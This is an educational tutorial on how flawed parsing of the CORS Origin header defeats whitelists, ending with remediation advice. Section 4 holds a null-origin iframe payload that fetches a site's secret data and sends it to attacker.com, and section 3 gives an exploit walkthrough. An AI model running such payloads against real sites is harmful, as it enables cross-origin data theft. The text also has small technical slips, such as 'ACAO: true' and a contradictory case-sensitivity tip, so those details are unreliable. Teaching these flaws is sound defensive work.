# Errors parsing Origin headers
---

## 1. What changed from the first attack?

In the first (very bad) example, the server **blindly reflected any Origin** — no checking at all.

**Now**: The server maintains a **whitelist** — a list of allowed domains.  
Example whitelist:
```
https://trusted-partner.com
https://analytics.trusted.com
https://app.customer.com
```

If the request's `Origin` header matches something on this list, the server reflects it back in `ACAO`.  
If not → no `ACAO` header (or a denial).

This seems safer, right?  
**But errors in parsing the Origin header can break this protection.**

---

## 2. How parsing errors happen

The server reads the `Origin` header as a **string** and tries to match it against the whitelist.  
If the programmer makes mistakes in how they parse or compare strings, attackers can **trick** the check.

### Common parsing mistakes:

#### Mistake 1: Not normalizing the origin
The Origin header might look like:
- `https://trusted-partner.com` (normal)
- `https://trusted-partner.com/` (trailing slash)
- `https://trusted-partner.com:443` (explicit port)
- `https://trusted-partner.com.evil.com` (subdomain trick)

If the whitelist contains `https://trusted-partner.com` but the server's comparison is sloppy, an attacker might send:
```
Origin: https://trusted-partner.com.evil.com
```
If the server just checks if the whitelist entry **appears anywhere inside** the Origin (instead of exact match), it might say:  
“Yes! `https://trusted-partner.com` is inside `https://trusted-partner.com.evil.com`” → **Wrongly allow**.

#### Mistake 2: Using regex incorrectly
Example whitelist check with bad regex:
```javascript
let allowed = ["trusted-partner.com"];
let origin = "https://trusted-partner.com.attacker.com";
if (origin.match(/trusted-partner.com$/)) {  // $ means "ends with"
    // allow
}
```
`trusted-partner.com.attacker.com` ends with `trusted-partner.com`? No — it ends with `attacker.com`. But a different bad regex like:
```javascript
if (origin.match(/trusted-partner\.com/)) {  // no start/end anchors
    // allow
}
```
This would match `trusted-partner.com.attacker.com` because `trusted-partner.com` appears inside. **Boom — bypassed.**

#### Mistake 3: Allowing null origins
Some browsers send `Origin: null` for:
- Local files (`file://`)
- Sandboxed iframes
- Data URLs

If the whitelist includes `null` (some lazy devs do this to “make it work”), an attacker can:
1. Embed their exploit in a sandboxed iframe.
2. The browser sends `Origin: null`.
3. Server sees `null` on whitelist → reflects `ACAO: null`.
4. Attacker can read the response.

---

## 3. Step-by-step exploit example

Let's say `normal-website.com` has a whitelist:
```
https://normal-website.com
https://api.normal-website.com
```
And it uses **bad substring matching** like:
```python
if whitelist_origin in request_origin:   # INSECURE!
    set_ACAO(request_origin)
```

### Attacker’s plan:
1. Register domain: `normal-website.com.attacker.net`
2. Send request from there to `normal-website.com/api/user-data`
3. Browser sends: `Origin: https://normal-website.com.attacker.net`
4. Server checks: Is any whitelist entry inside that string?  
   `https://normal-website.com` **is** inside `https://normal-website.com.attacker.net` → YES.
5. Server reflects: `ACAO: https://normal-website.com.attacker.net`
6. Browser sees: Allowed origin matches the requesting page → grants access.
7. Attacker steals data (same as before).

The server **thought** it was allowing only `normal-website.com`, but its broken parsing allowed `normal-website.com.attacker.net`.

---

## 4. Another real example: null origin attack

Vulnerable server whitelist includes `null` (maybe for testing, left in production).

Attacker crafts:
```html
<iframe sandbox="allow-scripts allow-same-origin" 
        src="data:text/html,<script>
          fetch('https://normal-website.com/api/secret')
          .then(r=>r.text())
          .then(data=>fetch('https://attacker.com/log?data='+data))
        </script>">
</iframe>
```
- Sandboxed iframe → browser sends `Origin: null`.
- Server sees `null` in whitelist → reflects `ACAO: null` and `ACAO: true`.
- Browser allows cross-origin read.
- Stolen data sent to attacker.

---

## 5. Why this is dangerous (even with a whitelist)

- **Whitelist gives false confidence** — developers think they’re safe, but parsing bugs create holes.
- **Difficult to test** — many edge cases (ports, trailing slashes, subdomain tricks, null).
- **Still allows credential theft** if `Access-Control-Allow-Credentials: true` is set.

---

## 6. How to fix it (for server developers)

### Safe approach:
1. **Never** use substring checks or loose regex.
2. **Always** do a **strict, case-sensitive, normalized comparison**.
3. **Normalize** the Origin before checking:
   - Remove default ports (`:443` for https, `:80` for http).
   - Remove trailing slashes.
   - Convert to lowercase.
4. **Reject `null`** unless absolutely needed (and then validate very carefully).
5. **Use a library** for CORS handling (e.g., `cors` package in Node.js, `django-cors-headers` in Python) instead of writing your own.

Example of a safe check (pseudocode):
```python
def is_allowed(origin):
    normalized = normalize(origin)  # remove trailing slash, default port
    return normalized in ALLOWED_ORIGINS_SET  # exact match only
```

---

## 7. Summary for absolute beginners

| Previous bad server | This bad server |
|---------------------|----------------|
| No whitelist at all | Has a whitelist ✅ |
| Reflects any origin | Checks whitelist first ✅ |
| ❌ Easy to exploit | ❌ Still exploitable if parsing is broken |

**The mistake here**: The server tries to be secure with a whitelist, but **bugs in how it reads and compares the Origin header** let attackers sneak in fake origins that **look like** they’re allowed.

It’s like a bouncer with a guest list, but instead of reading names carefully, they just glance and say “close enough — come in.”

---

## 8. Quick example to remember

Whitelist: `"trusted.com"`

Attacker sends Origin: `"trusted.com.attacker.net"`

- **Correct check**: Is `"trusted.com.attacker.net"` **exactly equal** to any whitelist entry? → No → Reject.
- **Broken check**: Does `"trusted.com"` **appear inside** `"trusted.com.attacker.net"`? → Yes → Allow.

The broken check is what attackers exploit.